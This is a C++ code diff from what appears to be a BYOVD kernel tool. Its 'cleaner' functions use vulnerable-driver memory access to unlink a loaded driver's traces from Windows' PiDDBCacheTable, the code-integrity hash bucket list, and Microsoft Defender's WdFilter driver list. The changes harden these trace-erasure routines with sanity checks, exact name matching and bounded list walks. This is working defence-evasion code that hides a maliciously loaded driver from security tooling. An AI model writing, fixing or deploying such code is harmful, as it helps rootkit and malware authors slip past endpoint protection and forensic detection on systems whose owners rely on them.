@@ -388,6 +388,21 @@ bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverN
         std::wcerr << L"[hinv::cleaner] PiDDB globals not located on this build\n";
         return false;
     }
+    // The table pattern is only 6 bytes — weak. Before taking the lock and
+    // calling into the AVL routines, sanity-check the candidate: a real
+    // RTL_AVL_TABLE has a CompareRoutine inside ntoskrnl's .text and a
+    // plausible element count. A false positive here would otherwise become an
+    // RtlLookup/Delete on garbage → bugcheck.
+    {
+        uint64_t cmp = 0;
+        uint32_t elemCount = 0;
+        if (!kmem::ReadU64(backend, tableVa + offsetof(KRTL_AVL_TABLE, CompareRoutine), cmp) ||
+            !kmem::ReadU32(backend, tableVa + offsetof(KRTL_AVL_TABLE, NumberGenericTableElements), elemCount) ||
+            !IsInModule(ntosBase, cmp) || elemCount > 0x100000) {
+            std::wcerr << L"[hinv::cleaner] PiDDBCacheTable candidate failed sanity check, aborting\n";
+            return false;
+        }
+    }
     std::cout << "[hinv::cleaner] PiDDBLock=0x" << std::hex << lockVa << " PiDDBCacheTable=0x" << tableVa << std::dec << "\n";
 
     kmem::Trace("cleaner: piddb lock acquire");
@@ -484,13 +499,17 @@ bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring
         return false;
     }
 
-    // g_HashCacheLock: a `lea rcx, [rip+rel]` shortly before the list reference.
+    // g_HashCacheLock: a `lea rcx, [rip+rel]` shortly BEFORE the list reference
+    // (kdmapper scans [sig-50, sig)). Scanning past matchVa could catch a lea
+    // AFTER the signature and resolve the wrong ERESOURCE — unlinking the list
+    // under the wrong lock is a race with CI.
     uint64_t hashLockVa = 0;
     {
         uint64_t scanStart = (matchVa > pageVa + 56) ? (matchVa - 56) : pageVa;
         uint8_t window[64]{};
         if (backend->ReadKernelMemory(scanStart, window, sizeof(window))) {
             for (size_t i = 0; i + 7 <= sizeof(window); ++i) {
+                if (scanStart + i >= matchVa) break; // never scan past the signature
                 if (window[i] == 0x48 && window[i + 1] == 0x8D && window[i + 2] == 0x0D) {
                     hashLockVa = ResolveLeaTarget(backend, scanStart + i);
                     break;
@@ -536,8 +555,9 @@ bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring
                 break;
 
             std::wstring entryName = ToLower(nameBuf.data());
-            if (entryName.find(fileName) != std::wstring::npos ||
-                entryName.find(stem) != std::wstring::npos) {
+            // Exact match only: a substring test makes "foo.sys" hit
+            // "foobar.sys", and an empty stem would match every entry.
+            if (entryName == fileName || (!stem.empty() && entryName == stem)) {
                 uint64_t next = 0;
                 if (!kmem::ReadU64(backend, entry, next)) break;
                 if (!kmem::WriteU64(backend, prev, next)) break;
@@ -567,8 +587,8 @@ bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& 
 
     uint64_t wdfBase = FindModuleBase(L"wdfilter.sys");
     if (!wdfBase) {
-        std::cout << "[hinv::cleaner] WdFilter.sys not loaded, skipping\n";
-        return true; // nothing to clean
+        std::cout << "[hinv::cleaner] WdFilter.sys not loaded, nothing to clean\n";
+        return false; // absence is not success: the caller must know nothing was removed
     }
 
     uint32_t pageSize = 0;
@@ -612,32 +632,41 @@ bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& 
         return false;
     }
 
+    // The pattern matches themselves must be inside WdFilter's image — a false
+    // positive on an incompatible build must never become a wild kernel read.
+    if (!IsInModule(wdfBase, listRef) || !IsInModule(wdfBase, countRef) || !IsInModule(wdfBase, freeRef)) {
+        std::wcerr << L"[hinv::cleaner] WdFilter pattern match outside image, aborting\n";
+        return false;
+    }
+
     // Resolve the relative references (kdmapper offsets).
     uint64_t runtimeDriversList = 0; {
         uint32_t rel = 0;
         if (!kmem::ReadU32(backend, listRef + 3, rel)) return false;
         runtimeDriversList = listRef + 7 + static_cast<int32_t>(rel);
     }
-    uint64_t runtimeDriversListHead = runtimeDriversList - 0x8;
     uint64_t runtimeDriversCount = 0; {
         uint32_t rel = 0;
         if (!kmem::ReadU32(backend, countRef + 2, rel)) return false;
         runtimeDriversCount = countRef + 6 + static_cast<int32_t>(rel);
     }
-    uint64_t runtimeDriversArray = runtimeDriversCount + 0x8;
-    if (!kmem::ReadU64(backend, runtimeDriversArray, runtimeDriversArray)) return false;
     uint64_t mpFreeDriverInfoEx = 0; {
         uint32_t rel = 0;
         if (!kmem::ReadU32(backend, freeRef + 1, rel)) return false;
         mpFreeDriverInfoEx = freeRef + 5 + static_cast<int32_t>(rel);
     }
     // All resolved addresses must live inside WdFilter's image; a bad pattern
-    // match must never turn into a wild kernel call.
+    // match must never turn into a wild kernel call. This validation happens
+    // BEFORE any pointer derived from them is dereferenced.
     if (!IsInModule(wdfBase, runtimeDriversList) || !IsInModule(wdfBase, runtimeDriversCount) ||
         !IsInModule(wdfBase, mpFreeDriverInfoEx)) {
         std::wcerr << L"[hinv::cleaner] WdFilter resolution out of image range, aborting\n";
         return false;
     }
+
+    uint64_t runtimeDriversListHead = runtimeDriversList - 0x8;
+    uint64_t runtimeDriversArray = runtimeDriversCount + 0x8;
+    if (!kmem::ReadU64(backend, runtimeDriversArray, runtimeDriversArray)) return false;
 
     std::wstring fileName = ToLower(driverName);
     size_t slash = fileName.find_last_of(L"\\/");
@@ -649,7 +678,13 @@ bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& 
     uint64_t entry = 0;
     if (!kmem::ReadU64(backend, runtimeDriversListHead, entry) || !entry) return false;
 
-    while (entry != runtimeDriversListHead) {
+    // Cap the walk: a corrupted list (self-referencing Flink) must never hang
+    // usermode forever.
+    for (int iterations = 0; entry != runtimeDriversListHead; ++iterations) {
+        if (iterations > 4096) {
+            std::wcerr << L"[hinv::cleaner] WdFilter list walk exceeded 4096 entries, aborting\n";
+            return false;
+        }
         UNICODE_STRING us{};
         if (!backend->ReadKernelMemory(entry + 0x10, &us, sizeof(us)) || !us.Buffer || !us.Length) break;
 
@@ -657,7 +692,8 @@ bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& 
         if (!backend->ReadKernelMemory(reinterpret_cast<uint64_t>(us.Buffer), nameBuf.data(), us.Length)) break;
 
         std::wstring entryName = ToLower(nameBuf.data());
-        if (entryName.find(fileName) == std::wstring::npos && entryName.find(stem) == std::wstring::npos) {
+        // Exact match only (see PiDDB/hashbucket notes on substring hazards).
+        if (entryName != fileName && (stem.empty() || entryName != stem)) {
             if (!kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Flink), entry)) break;
             if (!entry) break;
             continue;
